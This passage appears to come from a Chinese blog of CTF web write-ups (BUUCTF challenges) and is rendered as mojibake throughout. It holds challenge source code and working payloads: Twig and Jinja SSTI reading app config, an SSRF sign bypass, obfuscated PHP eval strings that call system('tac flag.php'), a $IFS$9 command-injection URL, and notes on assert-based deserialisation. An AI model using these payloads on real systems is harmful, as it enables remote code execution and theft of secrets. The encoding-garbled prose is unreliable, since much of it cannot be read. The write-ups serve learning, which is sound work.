¼ï¼Œåº”è¯¥æ˜¯è´­ä¹°ç‹¬è§’å…½ï¼Œè€Œä¸”priceåªå…è®¸è¾“å…¥ä¸€ä½æ•°ï¼Œå‰ä¸‰ä¸ªä¹°çš„æ—¶å€™éƒ½æ˜¾ç¤º</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210812165251531.png" alt="image-20210812165251531"></p><p>ä½†æ˜¯å› ä¸ºpriceçš„è¾“å…¥é™åˆ¶ï¼Œæ‰€ä»¥æˆ‘çŒœè¿™é‡Œåº”è¯¥æ˜¯è¦æƒ³åŠæ³•è´­ä¹°ç¬¬å››ä¸ªç‹¬è§’å…½</p><p>è¿™é‡Œè¦åˆ©ç”¨Unicodeçš„ç¼–ç ï¼ŒæŸ¥æ‰¾ä¸€ä¸ªå¤§äº1337çš„å­—ç¬¦</p><p><a href="https://www.compart.com/en/unicode/">https://www.compart.com/en/unicode/</a></p><p>æ¯”å¦‚è¿™ä¸ª</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210812165952292.png" alt="image-20210812165952292"></p><p>æˆåŠŸæ‹¿åˆ°flag</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210812170021095.png" alt="image-20210812170021095"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210812170027487.png" alt="image-20210812170027487"></p><h2 id="BJDCTF2020-Cookie-is-so-stable"><a href="#BJDCTF2020-Cookie-is-so-stable" class="headerlink" title="[BJDCTF2020]Cookie is so stable"></a>[BJDCTF2020]Cookie is so stable</h2><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210812220813990.png" alt="image-20210812220813990"></p><p>çœ‹ä¸€çœ¼hint</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210812220919778.png" alt="image-20210812220919778"></p><p>flagé¡µé¢çš„ç™»å½•æ¡†</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210812221024199.png" alt="image-20210812221024199"></p><p>è¿™é‡Œå­˜åœ¨sstiæ³¨å…¥</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210812220731194.png" alt="image-20210812220731194"></p><p>å¯ä»¥è¯•å‡ºæ¥æ˜¯twigæ¨¡æ¿ï¼Œæ ¹æ®æç¤ºæ³¨å…¥ç‚¹åº”è¯¥åœ¨cookieé‡Œï¼ŒæŠ“åŒ…</p><p>é€šè¿‡ä¿®æ”¹userå†…å®¹å®ç°æ³¨å…¥</p><p><a href="https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BSSTI%E6%BC%8F%E6%B4%9E/#2-Twig">ä¸€ç¯‡æ–‡ç« å¸¦ä½ ç†è§£æ¼æ´ä¹‹ SSTI æ¼æ´ | K0rz3n&#39;s Blog</a></p><p>è¿™é‡Œæ˜¯twig1.xç‰ˆæœ¬æ‰æœ‰çš„æ¨¡æ¿æ³¨å…¥ï¼Œåœ¨2.xå’Œ3.xç‰ˆæœ¬<code>__self</code> å˜é‡åœ¨ SSTI ä¸­æ—©å·²å¤±å»äº†ä»–çš„ä½œç”¨ï¼Œè¿™ä¹‹åä¸»è¦é€šè¿‡è¿‡æ»¤å™¨æ¥å®ç°æ”»å‡»<a href="https://xz.aliyun.com/t/10056#toc-14">https://xz.aliyun.com/t/10056#toc-14</a></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210812221739824.png" alt="image-20210812221739824"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210812221614830.png" alt="image-20210812221614830"></p><p>sstiè¿˜æ˜¯ä¸å¤ªæ‡‚ï¼Œæ¯•ç«Ÿæˆ‘pythonè¿˜æ˜¯æ²¡å­¦ä¼šï¼Œé‡åˆ°sstiçš„é¢˜æˆ‘åªèƒ½ç›´æ¥æ‰¾payloadï¼Œå…ˆæ”¾åœ¨è¿™ï¼Œç­‰åˆ·å®Œbuuç¬¬äºŒé¡µé¢˜ç›®ä¹‹åå†å›å¤´çœ‹ä¸€é</p><h2 id="De1CTF-2019-SSRF-Me"><a href="#De1CTF-2019-SSRF-Me" class="headerlink" title="[De1CTF 2019]SSRF Me"></a>[De1CTF 2019]SSRF Me</h2><p>é¢˜ç›®æºç </p><pre class="language-python" data-language="python"><code class="language-python">#! &#x2F;usr&#x2F;bin&#x2F;env python# #encoding&#x3D;utf-8from flask import Flaskfrom flask import requestimport socketimport hashlibimport urllibimport sysimport osimport jsonreload(sys)sys.setdefaultencoding(&#39;latin1&#39;)app &#x3D; Flask(__name__)secert_key &#x3D; os.urandom(16)class Task:    def __init__(self, action, param, sign, ip):        self.action &#x3D; action        self.param &#x3D; param        self.sign &#x3D; sign        self.sandbox &#x3D; md5(ip)        if(not os.path.exists(self.sandbox)):            os.mkdir(self.sandbox)    def Exec(self):        result &#x3D; &#123;&#125;        result[&#39;code&#39;] &#x3D; 500        if (self.checkSign()):            if &quot;scan&quot; in self.action:                tmpfile &#x3D; open(&quot;.&#x2F;%s&#x2F;result.txt&quot; % self.sandbox, &#39;w&#39;)                resp &#x3D; scan(self.param)                if (resp &#x3D;&#x3D; &quot;Connection Timeout&quot;):                    result[&#39;data&#39;] &#x3D; resp                else:                    print resp                    tmpfile.write(resp)                    tmpfile.close()                result[&#39;code&#39;] &#x3D; 200            if &quot;read&quot; in self.action:                f &#x3D; open(&quot;.&#x2F;%s&#x2F;result.txt&quot; % self.sandbox, &#39;r&#39;)                result[&#39;code&#39;] &#x3D; 200                result[&#39;data&#39;] &#x3D; f.read()            if result[&#39;code&#39;] &#x3D;&#x3D; 500:                result[&#39;data&#39;] &#x3D; &quot;Action Error&quot;        else:            result[&#39;code&#39;] &#x3D; 500            result[&#39;msg&#39;] &#x3D; &quot;Sign Error&quot;        return result         def checkSign(self):        if (getSign(self.action, self.param) &#x3D;&#x3D; self.sign):            return True        else:            return False@app.route(&quot;&#x2F;geneSign&quot;, methods&#x3D;[&#39;GET&#39;, &#39;POST&#39;])def geneSign():    param &#x3D; urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;))    action &#x3D; &quot;scan&quot;    return getSign(action, param)@app.route(&#39;&#x2F;De1ta&#39;,methods&#x3D;[&#39;GET&#39;,&#39;POST&#39;])def challenge():    action &#x3D; urllib.unquote(request.cookies.get(&quot;action&quot;))    param &#x3D; urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;))    sign &#x3D; urllib.unquote(request.cookies.get(&quot;sign&quot;))    ip &#x3D; request.remote_addr    if(waf(param)):        return &quot;No Hacker!!!!&quot;    task &#x3D; Task(action, param, sign, ip)    return json.dumps(task.Exec())@app.route(&#39;&#x2F;&#39;)def index():    return open(&quot;code.txt&quot;,&quot;r&quot;).read()def scan(param):    socket.setdefaulttimeout(1)    try:        return urllib.urlopen(param).read()[:50]    except:        return &quot;Connection Timeout&quot;def getSign(action, param):    return hashlib.md5(secert_key + param + action).hexdigest()def md5(content):    return hashlib.md5(content).hexdigest()def waf(param):    check&#x3D;param.strip().lower()    if check.startswith(&quot;gopher&quot;) or check.startswith(&quot;file&quot;):        return True    else:        return Falseif __name__ &#x3D;&#x3D; &#39;__main__&#39;:    app.debug &#x3D; False    app.run(host&#x3D;&#39;0.0.0.0&#39;,port&#x3D;9999)</code></pre><p>Flaskæ¡†æ¶ï¼Œå…ˆçœ‹è·¯ç”±ï¼ŒgeneSignæ˜¯å¯¹ä¼ å…¥çš„paramä¸å…¶ä»–å­—ç¬¦ä¸²æ‹¼æ¥å¹¶è¿”å›å…¶md5å€¼ï¼ŒDe1taæ˜¯ä¸»è¦ï¼Œä¼ å…¥3ä¸ªå‚æ•°ï¼Œä»¥åŠipï¼Œå…ˆåˆ¤æ–­paramæ˜¯å¦æ˜¯gopheræˆ–è€…fileå¼€å¤´çš„å‚æ•°ï¼Œä¸æ˜¯åˆ™è¿‡åˆ°Taskä¸­ï¼Œå¹¶ä¸”è¿”å›taskçš„Exec()å‡½æ•°ç»“æœï¼Œå¦å¤–hintç»™å‡ºæç¤ºåœ¨flag.txtä¸­æœ‰flag</p><pre class="language-none"><code class="language-none">1ï¼š&#x2F;geneSignï¼šè·å¾—urlä¸­parmaå‚æ•°ï¼Œé€šè¿‡getSign(action, param)ç”Ÿæˆæ‘˜è¦2ï¼š&#x2F;De1taï¼šè·å¾—cookieä¸­çš„actionå’Œsignï¼Œwaf(param),åˆ›å»ºtaskå¯¹è±¡ï¼Œè°ƒç”¨exce()æ–¹æ³•ï¼Œjsonæ ¼å¼è¿”å›3ï¼š&#x2F;ï¼šè¿”å›æºç </code></pre><p>ä¸‰ä¸ªå‡½æ•°</p><pre class="language-none"><code class="language-none">def getSign(action, param):    return hashlib.md5(secert_key + param + action).hexdigest()def md5(content):    return hashlib.md5(content).hexdigest()def waf(param):    check&#x3D;param.strip().lower()    if check.startswith(&quot;gopher&quot;) or check.startswith(&quot;file&quot;):        return True    else:        return False</code></pre><p>getSignï¼šè¿”å›secert_key + param + actionçš„å“ˆå¸Œå€¼<br>md5ï¼šè¿”å›contentçš„å“ˆå¸Œå€¼<br>wafï¼šç¦æ­¢äº†flieå’Œgopheråè®®</p><pre class="language-python" data-language="python"><code class="language-python">taskç±»class Task:    def __init__(self, action, param, sign, ip):        self.action &#x3D; action        self.param &#x3D; param        self.sign &#x3D; sign        self.sandbox &#x3D; md5(ip)        if(not os.path.exists(self.sandbox)):          #SandBox For Remote_Addr            os.mkdir(self.sandbox)def Exec(self):    result &#x3D; &#123;&#125;    result[&#39;code&#39;] &#x3D; 500    if (self.checkSign()):        if &quot;scan&quot; in self.action:            tmpfile &#x3D; open(&quot;.&#x2F;%s&#x2F;result.txt&quot; % self.sandbox, &#39;w&#39;)            resp &#x3D; scan(self.param)            if (resp &#x3D;&#x3D; &quot;Connection Timeout&quot;):                result[&#39;data&#39;] &#x3D; resp            else:                print resp                tmpfile.write(resp)                tmpfile.close()            result[&#39;code&#39;] &#x3D; 200        if &quot;read&quot; in self.action:            f &#x3D; open(&quot;.&#x2F;%s&#x2F;result.txt&quot; % self.sandbox, &#39;r&#39;)            result[&#39;code&#39;] &#x3D; 200            result[&#39;data&#39;] &#x3D; f.read()        if result[&#39;code&#39;] &#x3D;&#x3D; 500:            result[&#39;data&#39;] &#x3D; &quot;Action Error&quot;    else:        result[&#39;code&#39;] &#x3D; 500        result[&#39;msg&#39;] &#x3D; &quot;Sign Error&quot;    return resultdef checkSign(self):    if (getSign(self.action, self.param) &#x3D;&#x3D; self.sign):        return True    else:        return False</code></pre><p>checkSignï¼šæ£€æŸ¥cookieä¸­çš„sign<br>Execï¼šæ£€æŸ¥cookieä¸­çš„actionï¼Œå¦‚æœscanåœ¨actionä¸­ï¼Œå°†paramçš„æ–‡ä»¶å†…å®¹å†™å…¥result.txtï¼Œå¦‚æœreadåœ¨actionä¸­ï¼Œè¯»å‡ºresult.txt çš„å†…å®¹</p><p>hintæç¤ºflagåœ¨flag.txt ä¸­ï¼Œæƒ³è¦è¯»åˆ°ä»–<br>é¦–å…ˆï¼šaction=scanï¼Œparam=flag.txt ï¼Œå°†flag.txtçš„å†…å®¹è¯»åˆ°result.txtä¸­<br>ç„¶åï¼šaction=readï¼Œå°†result.txtçš„å†…å®¹è¯»å‡º</p><p>ç»•è¿‡ç‚¹ï¼šsign<br>checkSignä¼šæ£€æŸ¥cookieä¸­çš„sign==getSignï¼ˆparamï¼Œactionï¼‰<br>ä¸¤ä¸ªå›°éš¾ç‚¹ï¼šsecert_keyçš„å€¼æœªçŸ¥</p><p>æ€è·¯ï¼šå…ˆè¿›å…¥/De1taä¸­çš„challengeå‡½æ•°ï¼Œåœ¨Execä¸­çš„scanéƒ¨åˆ†ä¸­å°†flag.txtçš„å†…å®¹å­˜å…¥result.txtï¼Œç„¶åä»readéƒ¨åˆ†ä¸­å°†å…¶å­˜åˆ°resultå­—å…¸ä¸­è¯»å‡ºï¼Œå†ä»¥jsonå½¢å¼è¿”å›åˆ°å®¢æˆ·ç«¯ï¼Œæˆ‘ä»¬å°±èƒ½å¾—åˆ°flagã€‚</p><p>å†™å…¥ä¸è¯»å‡ºéƒ¨åˆ†</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210908232308596.png" alt="image-20210908232308596"></p><p>è€Œå¦‚æœactionä¸­æ—¢æœ‰scan,åˆæœ‰read,é‚£ä¹ˆå°±ä¼šä¾æ¬¡æ‰§è¡Œscanå’Œread</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210908233510363.png" alt="image-20210908233510363"></p><p>è€Œä¸ºäº†ç»•è¿‡è¿™ä¸ªéªŒè¯ï¼Œå°±è¦åˆ©ç”¨</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210908233542937.png" alt="image-20210908233542937"></p><p>è®©param = flag.txtread</p><p>å› ä¸ºactionä¸ºscan</p><p>æ‰€ä»¥å¾—åˆ°çš„md5å€¼ä¸ºkeyflag.txtreadscan</p><p>æ»¡è¶³action=readscan param=flag.txtæ—¶çš„å€¼</p><p><strong>è§£é¢˜</strong></p><p>â€‹    é¦–å…ˆè¿›å…¥genesigné¡µé¢å¾—åˆ°md5(keyflag.txtreadscan)çš„å€¼ä½œä¸ºsign</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210908234141816.png" alt="image-20210908234141816"></p><p>åœ¨åˆ°de1taç•Œé¢æŠ“åŒ…getè¿›param=flag.phpï¼Œåœ¨cookieå†…åŠ å…¥signå’Œaction</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210908234443102.png" alt="image-20210908234443102"></p><h2 id="CISCN-2019-åˆèµ›-Love-Math"><a href="#CISCN-2019-åˆèµ›-Love-Math" class="headerlink" title="[CISCN 2019 åˆèµ›]Love Math"></a>[CISCN 2019 åˆèµ›]Love Math</h2><p>æºç </p><pre class="language-none"><code class="language-none">&lt;?phperror_reporting(0);&#x2F;&#x2F;å¬è¯´ä½ å¾ˆå–œæ¬¢æ•°å­¦ï¼Œä¸çŸ¥é“ä½ æ˜¯å¦çˆ±å®ƒèƒœè¿‡çˆ±flagif(!isset($_GET[&#39;c&#39;]))&#123;    show_source(__FILE__);&#125;else&#123;    &#x2F;&#x2F;ä¾‹å­ c&#x3D;20-1    $content &#x3D; $_GET[&#39;c&#39;];    if (strlen($content) &gt;&#x3D; 80) &#123;        die(&quot;å¤ªé•¿äº†ä¸ä¼šç®—&quot;);    &#125;    $blacklist &#x3D; [&#39; &#39;, &#39;\t&#39;, &#39;\r&#39;, &#39;\n&#39;,&#39;\&#39;&#39;, &#39;&quot;&#39;, &#39;&#96;&#39;, &#39;\[&#39;, &#39;\]&#39;];    foreach ($blacklist as $blackitem) &#123;        if (preg_match(&#39;&#x2F;&#39; . $blackitem . &#39;&#x2F;m&#39;, $content)) &#123;            die(&quot;è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å­—ç¬¦&quot;);        &#125;    &#125;    &#x2F;&#x2F;å¸¸ç”¨æ•°å­¦å‡½æ•°http:&#x2F;&#x2F;www.w3school.com.cn&#x2F;php&#x2F;php_ref_math.asp    $whitelist &#x3D; [&#39;abs&#39;, &#39;acos&#39;, &#39;acosh&#39;, &#39;asin&#39;, &#39;asinh&#39;, &#39;atan2&#39;, &#39;atan&#39;, &#39;atanh&#39;, &#39;base_convert&#39;, &#39;bindec&#39;, &#39;ceil&#39;, &#39;cos&#39;, &#39;cosh&#39;, &#39;decbin&#39;, &#39;dechex&#39;, &#39;decoct&#39;, &#39;deg2rad&#39;, &#39;exp&#39;, &#39;expm1&#39;, &#39;floor&#39;, &#39;fmod&#39;, &#39;getrandmax&#39;, &#39;hexdec&#39;, &#39;hypot&#39;, &#39;is_finite&#39;, &#39;is_infinite&#39;, &#39;is_nan&#39;, &#39;lcg_value&#39;, &#39;log10&#39;, &#39;log1p&#39;, &#39;log&#39;, &#39;max&#39;, &#39;min&#39;, &#39;mt_getrandmax&#39;, &#39;mt_rand&#39;, &#39;mt_srand&#39;, &#39;octdec&#39;, &#39;pi&#39;, &#39;pow&#39;, &#39;rad2deg&#39;, &#39;rand&#39;, &#39;round&#39;, &#39;sin&#39;, &#39;sinh&#39;, &#39;sqrt&#39;, &#39;srand&#39;, &#39;tan&#39;, &#39;tanh&#39;];    preg_match_all(&#39;&#x2F;[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*&#x2F;&#39;, $content, $used_funcs);      foreach ($used_funcs[0] as $func) &#123;        if (!in_array($func, $whitelist)) &#123;            die(&quot;è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å‡½æ•°&quot;);        &#125;    &#125;    &#x2F;&#x2F;å¸®ä½ ç®—å‡ºç­”æ¡ˆ    eval(&#39;echo &#39;.$content.&#39;;&#39;);&#125;</code></pre><p>payloadï¼š</p><pre class="language-txt" data-language="txt"><code class="language-txt">$pi&#x3D;base_convert(37907361743,10,36)(dechex(1598506324));($$pi)&#123;pi&#125;(($$pi)&#123;abs&#125;)&amp;pi&#x3D;system&amp;abs&#x3D;tac flag.phpæˆ–$pi&#x3D;base_convert,$pi(696468,10,36)($pi(8768397090111664438,10,30)()&#123;1&#125;)($pi&#x3D;base_convert)(22950,23,34)($pi(76478043844,9,34)(dechex(109270211257898)))æˆ–base_convert(1751504350,10,36)(base_convert(15941,10,36).(dechex(16)^asinh^pi))</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220723233130669.png" alt="image-20220723233130669"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220723233250167.png" alt="image-20220723233250167"></p><p><a href="https://www.cnblogs.com/20175211lyz/p/11588219.html">CISCN 2019 åˆèµ›]Love Math - MustaphaMond - åšå®¢å›­ (cnblogs.com)</a></p><p> <a href="https://blog.csdn.net/miuzzx/article/details/104817391">CISCN 2019 åˆèµ›]Love Math_ç¾½çš„åšå®¢-CSDNåšå®¢</a></p><p><a href="https://blog.csdn.net/qq_37589805/article/details/116205287?utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-1.baidujsUnder6&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-1.baidujsUnder6">CISCN 2019 åˆèµ›]Love Math_åˆ†äº«ç®€å•çš„å®‰å…¨æŠ€æœ¯-CSDNåšå®¢</a></p><h2 id="WUSTCTF2020-æœ´å®æ— å"><a href="#WUSTCTF2020-æœ´å®æ— å" class="headerlink" title="[WUSTCTF2020]æœ´å®æ— å"></a>[WUSTCTF2020]æœ´å®æ— å</h2><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210828220705465.png" alt="image-20210828220705465"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210828220729509.png" alt="image-20210828220729509"></p><p>level1</p><blockquote><p><strong>intval()</strong> å‡½æ•°ç”¨äºè·å–å˜é‡çš„æ•´æ•°å€¼ã€‚</p></blockquote><p>æµ‹è¯•ï¼š</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?php    $a &#x3D; &#39;2e4&#39;;    var_dump($a);    var_dump(intval($a));    $b &#x3D; $a + 1;    echo $b.&quot;\n&quot;;    var_dump($b);    var_dump(intval($b));</code></pre><p>è¾“å‡º</p><pre class="language-php" data-language="php"><code class="language-php">string(3) &quot;2e4&quot;int(2)20001float(20001)int(20001)</code></pre><p>level2</p><p><strong>phpå¼±æ¯”è¾ƒï¼Œphpä¼šå°†ä»¥0xå¼€å¤´çš„å­—ç¬¦ä¸²ï¼Œå½“è¿›è¡Œ==å¼±æ¯”è¾ƒæ—¶ï¼Œä¼šè®¤ä¸ºæ˜¯ç›¸åŒçš„ã€‚</strong></p><p>æ‰€ä»¥å°±å˜æˆäº†æ‰¾åˆ°ä¸€ä¸ªä»¥0eå¼€å¤´çš„å­—ç¬¦ä¸²s,å¹¶ä¸”smd5(s)ä¹Ÿæ˜¯ä»¥0eå¼€å¤´çš„å­—ç¬¦ä¸²ã€‚</p><p><strong>0e215962017</strong></p><p>level3</p><p>**<code>$IFS$9</code>**æ›¿ä»£ç©ºæ ¼ï¼Œç”¨å…¶ä»–çš„æŸ¥çœ‹æ–‡ä»¶å‘½ä»¤ä»£æ›¿cat</p><p>payloadï¼š</p><pre class="language-txt" data-language="txt"><code class="language-txt">ï¼Ÿnum&#x3D;1e10&amp;md5&#x3D;0e215962017&amp;get_flag&#x3D;more$IFS$9fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210828221110477.png" alt="image-20210828221110477"></p><h2 id="WesternCTF2018-shrine"><a href="#WesternCTF2018-shrine" class="headerlink" title="[WesternCTF2018]shrine"></a>[WesternCTF2018]shrine</h2><pre class="language-none"><code class="language-none">import flaskimport osapp &#x3D; flask.Flask(__name__)app.config[&#39;FLAG&#39;] &#x3D; os.environ.pop(&#39;FLAG&#39;)&#x2F;&#x2F;æ³¨å†Œäº†ä¸€ä¸ªåä¸ºFLAGçš„configï¼Œè¿™é‡ŒåŸºæœ¬å¯ä»¥ç¡®å®šæ˜¯flagã€‚@app.route(&#39;&#x2F;&#39;)def index():    return open(__file__).read()@app.route(&#39;&#x2F;shrine&#x2F;&lt;path:shrine&gt;&#39;)def shrine(shrine):    def safe_jinja(s):        s &#x3D; s.replace(&#39;(&#39;, &#39;&#39;).replace(&#39;)&#39;, &#39;&#39;)        blacklist &#x3D; [&#39;config&#39;, &#39;self&#39;]&#x2F;&#x2F;è®¾ç½®é»‘åå•        return &#39;&#39;.join([&#39;&#123;&#123;% set &#123;&#125;&#x3D;None%&#125;&#125;&#39;.format(c) for c in blacklist]) + s&#x2F;&#x2F;æŠŠé»‘åå•å†…çš„å†…å®¹ç½®ç©º    return flask.render_template_string(safe_jinja(shrine))if __name__ &#x3D;&#x3D; &#39;__main__&#39;:    app.run(debug&#x3D;True)</code></pre><p>sstiæ³¨å…¥ï¼Œå…ˆè¯•ä¸€ä¸ª<code>&#123;&#123;7*7&#125;&#125;</code></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210829230144787.png" alt="image-20210829230144787"></p><p>æ¥ä¸‹æ¥å°±å¯ä»¥è€ƒè™‘åœ¨shrineä¸‹ç›´æ¥<code>&#123;&#123;config&#125;&#125;</code>å³å¯æŸ¥çœ‹æ‰€æœ‰app.configå†…å®¹ï¼Œä½†æ˜¯è¿™é¢˜è®¾äº†é»‘åå•[&#39;config&#39;,&#39;self&#39;]å¹¶ä¸”è¿‡æ»¤äº†æ‹¬å·ï¼Œä½†æ˜¯pythonè¿˜æœ‰ä¸€ä¸ªå‡½æ•°å«åšurl_forï¼Œå…¶ä½œç”¨æ˜¯urlæ˜¯ç”¨äºæ„å»ºæŒ‡å®šå‡½æ•°çš„URLï¼Œå†é…åˆglobalsï¼Œè¯¥å‡½æ•°ä¼šä»¥å­—å…¸ç±»å‹è¿”å›å½“å‰ä½ç½®çš„å…¨éƒ¨å…¨å±€å˜é‡ã€‚è¿™æ ·ä¹Ÿå¯ä»¥å®ç°æŸ¥çœ‹çš„æ•ˆæœ</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210829230829515.png" alt="image-20210829230829515"></p><p>current_appæ„æ€åº”è¯¥æ˜¯å½“å‰appï¼Œé‚£æˆ‘ä»¬å°±å½“å‰appä¸‹çš„configï¼š</p><p>äºæ˜¯å¯ä»¥è¯»åˆ°flag</p><pre class="language-none"><code class="language-none">&#123;&#123;url_for.__globals__[&#39;current_app&#39;].config&#125;&#125;</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210829230933251.png" alt="image-20210829230933251"></p><p>ä¹Ÿå¯ä»¥ç”¨</p><pre class="language-none"><code class="language-none">get_flashed_messages</code></pre><p>è¿”å›ä¹‹å‰åœ¨Flaskä¸­é€šè¿‡ flash() ä¼ å…¥çš„é—ªç°ä¿¡æ¯åˆ—è¡¨ã€‚æŠŠå­—ç¬¦ä¸²å¯¹è±¡è¡¨ç¤ºçš„æ¶ˆæ¯åŠ å…¥åˆ°ä¸€ä¸ªæ¶ˆæ¯é˜Ÿåˆ—ä¸­ï¼Œç„¶åé€šè¿‡è°ƒç”¨ get_flashed_messages() æ–¹æ³•å–å‡º(é—ªç°ä¿¡æ¯åªèƒ½å–å‡ºä¸€æ¬¡ï¼Œå–å‡ºåé—ªç°ä¿¡æ¯ä¼šè¢«æ¸…ç©º)ã€‚</p><pre class="language-none"><code class="language-none">get_flashed_messages.__globals__[&#39;current_app&#39;].config</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210829231104006.png" alt="image-20210829231104006"></p><h2 id="MRCTF2020-PYWebsite"><a href="#MRCTF2020-PYWebsite" class="headerlink" title="[MRCTF2020]PYWebsite"></a>[MRCTF2020]PYWebsite</h2><p>è¿›å»åçœ‹æºç ï¼Œæœ‰ä¸€æ®µjsè„šæœ¬</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210906112938529.png" alt="image-20210906112938529"></p><p>è¯•äº†ä¸€ä¸‹è¿™ä¸ªmd5ï¼Œèƒ½è§£å‡ºæ¥ä½†æ˜¯æ˜¯ä»˜è´¹è®°å½•</p><p>æ‰€ä»¥ç›´æ¥çœ‹flag.php</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210906113351506.png" alt="image-20210906113351506"></p><p>â€œé™¤äº†è´­ä¹°è€…å’Œæˆ‘è‡ªå·±â€</p><p>é‚£å°±è¯•è¯•127.0.0.1æœ¬åœ°è®¿é—®</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210906113445324.png" alt="image-20210906113445324"></p><h2 id="NPUCTF2020-ReadlezPHP"><a href="#NPUCTF2020-ReadlezPHP" class="headerlink" title="[NPUCTF2020]ReadlezPHP"></a>[NPUCTF2020]ReadlezPHP</h2><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210907150757059.png" alt="image-20210907150757059"></p><p>è·³åˆ°time.php?sourceç•Œé¢çœ‹çœ‹å†…å®¹</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210907150827681.png" alt="image-20210907150827681"></p><p>ååºåˆ—åŒ–æ„é€ å®ç°å‘½ä»¤æ‰§è¡Œ</p><p>evalè¿™é‡Œåº”è¯¥æ˜¯è¿‡æ»¤äº†ï¼Œå¯ä»¥ç”¨assertä»£æ›¿</p><pre class="language-none"><code class="language-none">assert()ç®€ä»‹ï¼šåˆ¤æ–­ä¸€ä¸ªè¡¨è¾¾å¼æ˜¯å¦æˆç«‹ã€‚è¿”å›true or falseã€‚å½“å‚æ•°ä¸ºå­—ç¬¦ä¸²æ—¶ï¼Œä¼šè¢«å½“ä½œphpä»£ç æ‰§è¡Œã€‚ä¾‹å¦‚ assert(&quot;phpinfo()&quot;)  &lt;&#x3D;&#x3D;&gt;  &lt;?phpinfo()?&gt;assertä¸evalçš„åŒºåˆ«assertæŠŠæ•´ä¸ªå­—ç¬¦ä¸²å‚æ•°å½“phpä»£ç 